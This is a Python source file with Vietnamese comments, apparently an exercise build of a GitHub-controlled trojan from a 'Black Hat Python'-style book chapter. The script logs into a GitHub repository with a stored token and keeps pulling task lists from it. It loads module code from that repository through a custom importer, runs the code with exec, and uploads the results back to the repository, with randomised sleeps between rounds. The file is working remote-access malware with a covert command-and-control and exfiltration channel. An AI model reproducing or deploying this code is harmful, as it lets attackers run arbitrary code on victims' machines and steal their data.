import base64
import github3
import importlib.util
import json
import os
import random
import sys
import threading
import time
from datetime import datetime


# Kết nối GitHub
def github_connect():
    with open('chapter_7/bhptrojan/my_token.txt') as f:
        token = f.read().strip()

    username = 'ybvy'
    repo_name = 'bhptrojan'

    sess = github3.login(token=token)
    return sess.repository(username, repo_name)


# Lấy nội dung file từ GitHub
def get_file_content(dirname: str, module_name: str, repo: github3.repos.Repository) -> bytes:
    file = repo.file_contents(f"{dirname}/{module_name}")

    decoded_content = base64.b64decode(file.content)
    print(f"DEBUG: Retrieved {module_name} content:\n{decoded_content.decode(errors='replace')}")

    return decoded_content


# Lớp chính của Trojan
class Trojan:
    def __init__(self, trojan_id: str):
        self.id = trojan_id
        self.config_file = f'{trojan_id}.json'
        self.data_path = f'data/{trojan_id}/'
        self.repo = github_connect()

        if not os.path.exists(self.data_path):
            os.makedirs(self.data_path)

    # Lấy cấu hình từ GitHub
    def get_config(self):
        config_json = get_file_content("config", self.config_file, self.repo)
        config = json.loads(config_json)

        for task in config:
            if task['module'] not in sys.modules:
                exec(f"import {task['module']}")

        return config

    # Chạy module
    def module_runner(self, module):
        result = sys.modules[module].run()
        self.store_module_result(result)

    # Lưu kết quả lên GitHub
    def store_module_result(self, data):
        message = datetime.now().isoformat()
        remote_path = f'data/{self.id}/{message}.data'
        bindata = bytes('%r' % data, 'utf-8')

        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    # Vòng lặp chạy Trojan
    def run(self):
        while True:
            config = self.get_config()
            for task in config:
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()

            time.sleep(random.randint(1, 10))
            time.sleep(random.randint(30 * 60, 3 * 60 * 60))


# Tự động import module từ GitHub
class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):
        print(f"[*] Attempting to retrieve module: {name}")
        self.repo = github_connect()
        new_library = get_file_content("modules", f"{name}.py", self.repo)

        if new_library:
            self.current_module_code = new_library
            return self
        else:
            print(f"[ERROR] Failed to retrieve {name}")
            return None

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)

        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


# Chạy Trojan
if __name__ == '__main__':
    sys.meta_path.append(GitImporter())
    trojan = Trojan('abc')
    trojan.run()
